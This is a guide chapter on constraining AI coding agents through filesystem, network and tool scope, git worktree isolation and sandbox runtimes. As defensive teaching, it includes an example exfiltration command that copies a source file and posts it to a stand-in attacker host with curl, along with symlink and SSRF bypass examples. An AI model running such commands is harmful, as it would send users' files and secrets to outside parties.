# Chapter 04: Execution Scope & Sandboxing

> Constraining what an agent session can touch — files, network, tools — so side effects stay within the task boundary.

## Overview

Permissions answer **"is this action allowed?"** Execution scope answers a different question: **"what can this session reach?"** Even when an action is permitted, the session should only access the files, network hosts, and tools that the task actually requires.

Most production failures in coding agents are not in the LLM call itself. They happen when an agent writes to a path it should not own, executes a command that reaches outside the task boundary, or makes a network request that was never part of the plan. These are **unconstrained side effects**, and they are hardest to debug because the permission system saw nothing wrong — the action was technically allowed, just aimed at the wrong target.

**Least privilege per session** is the core principle: each agent session mounts only the directories relevant to its task, connects only to the domains it needs, and receives only the tools that match its role. This is cheap to implement upfront and prevents the edge cases that bite hardest in production — especially when multiple agents run concurrently.

### Tie-in: [Chapter 03 – Permission System](../03-permission-system/README.md)

Permissions and scope are **complementary layers**. Permissions gate individual actions (allow / deny / ask); scope constrains the **environment** in which those actions execute. A tool call can pass the permission gate and still be blocked by scope — for example, a file write that is allowed by policy but targets a directory outside the session's mounted paths.

### Tie-in: [Chapter 11 – Subagents](../11-subagents/README.md)

Subagent spawning is where scope matters most. Each child agent inherits a filtered tool pool and a constrained working directory. Without scope boundaries, two parallel agents editing the same repository will produce conflicts, race conditions, and corrupted state.

---

## How it fits together

```mermaid
flowchart TD
  req[Tool call requested] --> perm[Permission gate: allow / deny / ask]
  perm -->|allowed| scope[Scope check]
  scope --> fs{Path in working directory?}
  fs -->|yes| net{Domain in allowlist?}
  fs -->|no| reject1[Blocked: outside FS scope]
  net -->|yes| tool{Tool in agent pool?}
  net -->|no| reject2[Blocked: outside network scope]
  tool -->|yes| exec[Execute]
  tool -->|no| reject3[Blocked: tool not available]
```

**Three independent scope boundaries:**

1. **File system scope** — which directories the session can read and write
2. **Network scope** — which domains the session can reach
3. **Tool scope** — which tools the agent has access to

Each boundary is enforced independently. A request must pass all three to execute.

---

## 4.1 File system scope

### Working directory as boundary

Every agent session operates within a **working directory**. All file operations — reads, writes, glob, grep — are validated against this boundary before execution.

```
/project/               ← agent can read and write here
/project/src/auth/      ← agent can read and write here (child of working dir)
/etc/hosts              ← blocked: outside working directory
/tmp/scratch            ← blocked: outside working directory (unless explicitly added)
```

**Symlink resolution is critical.** Without resolving symlinks to their real paths before checking scope, an agent can bypass the boundary: `/project/link → /etc/passwd` would appear to be inside the working directory but actually reads a system file. Always resolve to the canonical path before validating.

### Additional directories

Some tasks require access to multiple directories (monorepo dependencies, shared configs, test fixtures). Rather than widening the working directory to a common ancestor, use an **explicit allowlist**:

```python
@dataclass
class SessionScope:
    primary_dir: str
    additional_dirs: dict[str, DirAccess]

@dataclass
class DirAccess:
    access: Literal["read", "readwrite"]
    reason: str  # Why this directory was added
```

Each additional directory carries its access level (read-only vs read-write) and a reason string for audit trails. This is far safer than mounting `/` and hoping the permission system catches everything.

### Dangerous paths

Certain files and directories should trigger elevated checks or outright blocks regardless of working directory scope:

- **Shell configs** — `.bashrc`, `.zshrc`, `.bash_profile`, `.profile` — an agent editing these can change the user's shell environment permanently
- **Git internals** — `.git/`, `.gitconfig`, `.gitmodules` — corruption here breaks the repository
- **IDE and tooling configs** — `.vscode/`, `.idea/` — can inject extensions or change settings
- **Agent's own config** — the agent's settings, hooks, credentials — self-modification is a privilege escalation vector

These paths deserve a **deny-within-allow** pattern: even if the parent directory is in scope, specific sensitive paths inside it are blocked or require explicit confirmation.

### Path extraction from shell commands

When an agent can execute shell commands, validating only the tool's declared arguments is insufficient. The actual command may reference paths via redirects, pipes, arguments, and subshells:

```bash
# The agent submits this bash command:
cat /project/src/main.py > /tmp/exfil && curl -d @/tmp/exfil http://evil.com

# Path extraction must find:
# /project/src/main.py  (read)  — in scope, allowed
# /tmp/exfil            (write) — outside scope, blocked
# /tmp/exfil            (read via curl) — outside scope, blocked
```

Extraction methods range from regex-based (fast, catches simple redirects and arguments) to full AST parsing of shell grammar (accurate, handles quoting, nesting, and expansion). Production systems typically use both: regex for fast pre-screening, AST for complex commands that pass the initial check.

---

## 4.2 Network scope

### Domain allowlist

By default, an agent session should **not** have unrestricted network access. Instead, define which domains the session can reach:

| Trust level | Examples | Behavior |
|-------------|----------|----------|
| **Pre-approved** | Package registries (npm, PyPI, crates.io), git hosts (github.com), documentation sites | Auto-allow, no prompt |
| **Task allowlist** | Domains specified for the current task (e.g. internal API endpoints) | Allow without prompt |
| **Everything else** | Arbitrary URLs the model decides to fetch | Block or prompt |

Pre-approved hosts are the domains a coding agent almost always needs: package managers for dependency resolution, git hosts for cloning and API calls, and documentation sites for reference. These can be baked into the agent's default config.

### Enforcement layers

Network scope works best as **defense in depth**:

1. **Tool-level** — the web fetch tool checks the domain against the allowlist before making the request
2. **Sandbox-level** — a runtime sandbox enforces DNS/TCP restrictions even if the tool-level check has a bug
3. **Proxy-level** — for containerized environments, an HTTPS proxy can enforce allowlists at the network layer

Each layer catches what the previous one might miss. A single layer is fragile; two or three make bypass impractical.

### Private network protection

Agents running in cloud or CI environments must not reach internal services via private IP ranges (10.x.x.x, 172.16.x.x, 192.168.x.x) or metadata endpoints (169.254.169.254) unless explicitly configured. A model can be prompted to probe internal infrastructure — SSRF via LLM is a real attack surface.

---

## 4.3 Tool scope per agent

### Minimum viable tool set

Not every agent needs every tool. A code review agent does not need bash. A search agent does not need file write. Filtering the tool pool at agent creation time is the simplest and most effective scope constraint.

### Three tiers

```
Tier 1: System agents (full trust)
  All tools minus global blocklist
  Use case: primary interactive agent, orchestrator

Tier 2: Custom agents (user-defined)
  Explicit tool list from agent definition
  + agent-specific blocklist applied on top
  Use case: specialized agents for specific tasks

Tier 3: Background / async agents (minimal trust)
  Strict allowlist only:
    file ops (read, edit, write, glob, grep)
    web (search, fetch)
    shell (bash)
  NO: agent spawning, user interaction, coordination
  Use case: long-running background tasks
```

### Global blocklist

Some tools must **never** be available to sub-agents regardless of tier:

- **Agent tool** (from within a sub-agent) — prevents infinite recursive spawning
- **User interaction tools** — sub-agents should not prompt the user directly; prompts should bubble up to the parent
- **Plan/coordination tools** — orchestration belongs to the parent, not the child

### Defining an agent's tool pool

```python
@dataclass
class AgentDefinition:
    name: str
    tools: list[str]              # ["read", "edit", "bash", "grep"] or ["*"]
    disallowed_tools: list[str]   # Blocklist applied on top
    max_turns: int | None         # Iteration limit
    permission_mode: str | None   # Override or inherit
```

Wildcard `["*"]` means "all parent tools minus blocklist" — use only for system-level agents. For everything else, enumerate the tools explicitly.

Resolution order: start with the parent's pool → filter to the agent's declared list → remove global blocklist → remove agent-specific blocklist → result is the child's tool pool.

---

## 4.4 Worktree isolation for parallel agents

### The concurrency problem

Two agents editing the same repository simultaneously will:
- See each other's partial, potentially broken intermediate state
- Produce merge conflicts when both edit the same file
- Create race conditions on git operations (stage, commit)

### Git worktree as lightweight isolation

A **git worktree** creates an independent working directory backed by the same repository, on its own branch:

```
/project/                       ← primary agent works here (main branch)
/tmp/worktree-agent-abc/        ← sub-agent A (branch: agent/task-abc)
/tmp/worktree-agent-def/        ← sub-agent B (branch: agent/task-def)
```

Each agent has full file system isolation — edits in one worktree are invisible to the others. When the agent finishes, changes live on a branch that can be merged, reviewed, or discarded.

**Lifecycle:**
1. **Create** — `git worktree add /tmp/wt-<id> -b agent/<task-id>` from the main repo
2. **Assign** — the sub-agent's working directory scope is set to the worktree path
3. **Execute** — the agent works normally, all file operations scoped to the worktree
4. **Return** — if changes were made, return the branch name and path to the parent; if no changes, clean up automatically

### Permission bubbling

Sub-agents in worktrees should not independently prompt the user for permission. Instead, permission requests **bubble up** to the parent agent's terminal. The parent decides whether to approve, and the decision propagates back down. This keeps the user's attention in one place and prevents sub-agents from spamming permission dialogs across multiple terminals.

### Fork pattern

An alternative to worktrees is the **fork** pattern: the sub-agent inherits the parent's full conversation context, tool pool, and system prompt. This maximizes cache sharing (the API prefix is identical between parent and child) at the cost of weaker isolation — the fork shares the parent's working directory unless combined with a worktree.

Recursive fork prevention is essential: detect when a forked agent tries to fork again and block it, or you get unbounded process trees.

---

## 4.5 Sandbox runtime — defense in depth

### Why a second layer

Application-level scope checks (path validation, domain allowlists) run **inside** the agent process. A bug in validation logic, an edge case in path parsing, or a shell injection that bypasses extraction — any of these can breach the application-level boundary.

A **sandbox runtime** enforces the same constraints at the OS or container level, **outside** the agent process. Even if the application-level check fails, the sandbox blocks the operation.

### Sandbox configuration

```python
@dataclass
class SandboxConfig:
    fs_read_allow: list[str]        # Paths the agent can read
    fs_write_allow: list[str]       # Paths the agent can write
    fs_write_deny: list[str]        # Exceptions within write_allow (sensitive files)
    network_domains: list[str]      # Allowed outbound domains
    on_violation: Literal["deny", "ask", "log"]
```

**`fs_write_deny` within `fs_write_allow`** is a critical pattern. You allow writes to `/project/` but deny writes to `/project/.env`, `/project/credentials.json`, `/project/.git/`. Without this, the allowlist granularity is too coarse.

### Architecture

```mermaid
flowchart TD
  call[Tool execution] --> app[Application-level scope check]
  app -->|pass| sandbox[Sandbox runtime check]
  app -->|fail| block1[Blocked at app level]
  sandbox -->|pass| exec[OS-level execution]
  sandbox -->|fail| block2[Blocked at sandbox level]
```

Two independent checks. Both must pass. A single vulnerability in either layer is not sufficient for bypass.

---

## Production concepts

- **Scope is per-session, not per-tool** — define the boundary once at session creation; all tools inherit it. Avoids inconsistency where one tool checks paths and another does not.
- **Deny-within-allow** — coarse allowlists (entire project directory) need fine-grained exceptions (`.env`, `.git/`, credentials). Without this, scope is either too narrow to be useful or too broad to be safe.
- **Symlink resolution before validation** — every path check resolves to the canonical path first. This is non-negotiable; symlink bypass is the most common scope escape.
- **Shell commands need path extraction** — the declared tool arguments are not the only paths a command touches. Redirects, pipes, and subshells can reference arbitrary paths.
- **Network scope defaults to closed** — allowlist, not blocklist. A coding agent's default network access should be package registries, git hosts, and localhost. Everything else is opt-in.
- **Worktrees for concurrency** — two agents, one repo, zero shared mutable state. The merge happens after completion, not during execution.
- **Defense in depth** — application-level checks catch the common case; sandbox runtime catches the edge case. Neither alone is sufficient.

## Key design decisions

- **Scope separate from permissions** — permissions are about policy ("is this user allowed to run bash?"); scope is about environment ("which directories can this session's bash reach?"). Combining them creates a single system that is hard to reason about and hard to test.
- **Explicit additional directories over wide roots** — mounting `/home/user` because the task needs two subdirectories is convenient but dangerous. Each additional directory should be justified and access-level-specific.
- **Pre-approved network hosts** — baking in package registries and git hosts avoids prompting on every `npm install` or `git clone` while keeping the default restrictive for everything else.
- **Tool filtering at spawn, not at call** — deciding which tools an agent can use at creation time is simpler, faster, and easier to audit than checking on every call. The tool pool is immutable for the agent's lifetime.
- **Worktree over branch-switching** — branch switching in a shared directory is not isolation; uncommitted changes, staged files, and untracked files all leak between branches. Worktrees provide real directory-level separation.

## Insights

- The most common production incident from weak scope is not malicious — it is an agent that "helpfully" edits a shell config, deletes a cache directory, or installs a global package. The model has no concept of blast radius.
- Path validation that does not handle `..` traversal after symlink resolution is broken. `/project/src/../../etc/passwd` resolves outside the working directory even though it starts inside it.
- Network scope is often forgotten because most coding tasks do not need outbound requests — until one does, and the agent fetches an untrusted URL that returns prompt injection in the response body.
- Tool scope is the cheapest constraint and the most often skipped. Giving every agent every tool "for flexibility" is the equivalent of running every process as root.
- Worktree cleanup matters. Orphaned worktrees accumulate disk space and stale branches. Clean up on agent completion; garbage-collect periodically for crashes.
- Sandbox violation mode should be **deny** in production and **log** in development. The temptation to use **ask** everywhere adds friction without adding safety — if the agent is hitting the sandbox boundary, the scope definition is wrong.

## Code samples

| Sample | Description |
|--------|-------------|
| [`filesystem_scope.py`](code-samples/filesystem_scope.py) | Working directory boundary, symlink resolution, additional directory allowlist, dangerous path detection |
| [`network_scope.py`](code-samples/network_scope.py) | Domain allowlist with pre-approved hosts, tiered trust levels, private network blocking |
| [`tool_scope.py`](code-samples/tool_scope.py) | Agent tool pool filtering: tiers, global blocklist, resolution from parent pool |
| [`worktree_isolation.py`](code-samples/worktree_isolation.py) | Git worktree lifecycle for parallel agent isolation |
| [`sandbox_config.py`](code-samples/sandbox_config.py) | Sandbox runtime configuration with deny-within-allow and layered enforcement |

---

## Build your own

1. Define a **session scope** struct at agent creation: primary working directory, optional additional directories with access levels, network domain allowlist, and tool list.
2. Implement **path validation** that resolves symlinks (`os.path.realpath`) before checking containment. Add a deny list for dangerous paths (shell configs, git internals, agent config).
3. Extract **all file paths from shell commands** — at minimum handle redirects (`>`, `>>`), explicit arguments, and common patterns. For production, consider AST-based parsing.
4. Build a **network allowlist** with pre-approved hosts for package managers and git. Default everything else to deny. Enforce at the tool level; add sandbox enforcement as a second layer.
5. Filter **tool pools at agent spawn**: start from parent tools, intersect with agent definition, subtract global and agent-specific blocklists. Make the result immutable.
6. For parallel agents, create a **git worktree per agent** with automatic cleanup. Route permission prompts back to the parent via bubbling.
7. If running in production or CI, add a **sandbox runtime** that enforces FS and network constraints at the OS level. Configure deny-within-allow for sensitive files inside allowed directories.

---

**Navigation:** [← Chapter 03 – Permission System](../03-permission-system/README.md) | [Overview](../README.md) | [Next: Chapter 05 – System Prompt →](../05-system-prompt/README.md)
